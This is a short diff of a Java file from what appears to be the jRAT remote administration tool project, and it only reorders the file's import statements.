@@ -4,15 +4,15 @@ import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
 
-import su.jrat.client.Main;
-import su.jrat.client.Slave;
-import su.jrat.client.packets.outgoing.AbstractOutgoingPacket;
 import jrat.api.Connection;
 import jrat.api.PacketBuilder;
 import jrat.api.Queue;
 import jrat.api.RATObject;
 import jrat.api.Reader;
 import jrat.api.Writer;
+import su.jrat.client.Main;
+import su.jrat.client.Slave;
+import su.jrat.client.packets.outgoing.AbstractOutgoingPacket;
 
 public class RATObjectFormat {
 
